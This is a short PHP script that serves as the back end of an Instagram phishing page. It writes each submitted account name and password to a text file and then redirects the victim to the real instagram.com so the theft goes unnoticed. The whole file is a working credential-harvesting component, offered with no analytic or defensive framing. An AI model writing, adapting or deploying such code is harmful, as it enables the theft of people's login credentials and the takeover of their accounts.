<?php

file_put_contents("__sapreenah__.txt", "Account: " . $_POST['__sapreenah__'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
